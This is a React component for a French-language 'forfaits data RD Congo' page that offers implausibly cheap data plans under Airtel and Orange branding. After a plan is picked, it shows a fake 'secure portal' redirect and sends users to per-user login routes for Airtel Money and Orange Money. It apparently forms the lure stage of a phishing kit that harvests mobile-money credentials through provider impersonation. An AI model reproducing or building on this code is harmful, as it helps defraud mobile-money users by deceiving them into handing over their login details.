import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useData } from '../DataContext';
import { useUserId } from '../hooks/useUserId';
import './Dataplans.css';

const DATA_PLANS = [
  { id: 'starter',   data: '1GB',       price: 0.19, tag: null },
  { id: 'basic',     data: '3GB',       price: 0.39, tag: null },
  { id: 'standard',  data: '7GB',       price: 0.79, tag: null },
  { id: 'popular',   data: '15GB',      price: 1.49, tag: 'POPULAIRE' },
  { id: 'pro',       data: '30GB',      price: 2.99, tag: null },
  { id: 'max',       data: '50GB',      price: 5.49, tag: null },
  { id: 'unlimited', data: 'Illimité',  price: 7.49, tag: 'MEILLEUR CHOIX' },
];

// MaxIt is just the app; Orange is the actual money service provider.
// `route` keeps the existing /login/maxit backend route working unchanged.
const PROVIDERS = [
  {
    id: 'airtel',
    route: 'airtel',
    name: 'Airtel Money',
    desc: 'Payer avec Airtel Money',
    logo: '/vite.svg',
  },
  {
    id: 'orange',
    route: 'maxit',
    name: 'Orange Money',
    desc: 'Payer avec Orange Money',
    logo: '/orange.svg',
  },
];

const REDIRECT_DELAY_MS = 2500;

export default function Dataplans() {
  const navigate = useNavigate();
  const { selectDataPlan } = useData();
  const { userId } = useUserId();

  const [selectedPlan, setSelectedPlan] = useState(null);
  const [showProviders, setShowProviders] = useState(false);
  const [redirectingTo, setRedirectingTo] = useState(null);

  const redirectTimer = useRef(null);

  useEffect(() => {
    return () => clearTimeout(redirectTimer.current);
  }, []);

  const handlePlanSelect = (plan) => {
    setSelectedPlan(plan);
    setTimeout(() => setShowProviders(true), 300);
  };

  const handleProviderSelect = (provider) => {
    if (redirectingTo) return; // guard against double taps

    selectDataPlan({
      ...selectedPlan,
      provider: provider.id,
      providerName: provider.name,
    });

    setShowProviders(false);
    setRedirectingTo(provider);

    redirectTimer.current = setTimeout(() => {
      navigate(`/${userId}/login/${provider.route}`);
    }, REDIRECT_DELAY_MS);
  };

  const handleCloseSheet = () => {
    setShowProviders(false);
    setTimeout(() => setSelectedPlan(null), 300);
  };

  return (
    <div className="dataplans-container">
      {/* Header */}
      <header className="dataplans-header">
        <div className="flag-badge">
          <span className="flag">🇨🇩</span>
          FORFAITS DATA RD CONGO
        </div>
        <h1>Choisissez Votre Forfait</h1>
        <p>Sélectionnez un forfait data, puis choisissez votre mode de paiement</p>
      </header>

      {/* Plans Grid */}
      <div className="plans-grid">
        {DATA_PLANS.map((plan) => (
          <div
            key={plan.id}
            className={`plan-card${plan.tag === 'POPULAIRE' ? ' popular' : ''}${plan.id === 'unlimited' ? ' unlimited' : ''}${selectedPlan?.id === plan.id ? ' selected' : ''}`}
            onClick={() => handlePlanSelect(plan)}
          >
            {plan.tag && <div className="plan-tag">{plan.tag}</div>}
            <div className="plan-data">{plan.data}</div>
            <div className="plan-label">Forfait Data</div>
            <div className="plan-price">
              <span className="currency">$</span>
              {plan.price.toFixed(2)}
            </div>
            <div className="plan-period">30 jours</div>
          </div>
        ))}
      </div>

      {/* Trust strip */}
      <div className="trust-strip">
        <div className="trust-item">
          <span className="trust-icon">🔒</span>
          Sécurisé
        </div>
        <div className="trust-item">
          <span className="trust-icon">⚡</span>
          Instantané
        </div>
        <div className="trust-item">
          <span className="trust-icon">✓</span>
          Vérifié
        </div>
      </div>

      {/* Footer */}
      <footer className="dataplans-footer">
        <p>Services Data Mobile RDC<br />Propulsé par Airtel &amp; Orange</p>
      </footer>

      {/* Provider Selection Bottom Sheet */}
      {showProviders && selectedPlan && (
        <div className="provider-overlay" onClick={handleCloseSheet}>
          <div className="provider-sheet" onClick={(e) => e.stopPropagation()}>
            <div className="sheet-handle" />

            <div className="sheet-header">
              <div className="selected-plan-badge">
                📦 <span className="plan-amount">{selectedPlan.data}</span> — ${selectedPlan.price.toFixed(2)}
              </div>
              <h2>Choisir le Fournisseur</h2>
              <p>Sélectionnez votre mode de paiement</p>
            </div>

            <div className="provider-options">
              {PROVIDERS.map((provider) => (
                <div
                  key={provider.id}
                  className={`provider-card ${provider.id}`}
                  onClick={() => handleProviderSelect(provider)}
                >
                  <img className="provider-icon" src={provider.logo} alt={provider.name} />
                  <div className="provider-info">
                    <div className="provider-name">{provider.name}</div>
                    <div className="provider-desc">{provider.desc}</div>
                  </div>
                  <div className="provider-arrow">→</div>
                </div>
              ))}
            </div>

            <button className="sheet-close" onClick={handleCloseSheet}>
              Annuler
            </button>
          </div>
        </div>
      )}

      {/* Processing / Redirect Modal */}
      {redirectingTo && (
        <div className="redirect-overlay">
          <div className={`redirect-modal ${redirectingTo.id}`}>
            <div className="redirect-spinner" />
            <h3>Redirection en cours</h3>
            <p>
              Redirection vers le portail sécurisé{' '}
              <strong>{redirectingTo.name}</strong>
            </p>
            <div className="redirect-secure">🔒 Connexion sécurisée</div>
          </div>
        </div>
      )}
    </div>
  );
}
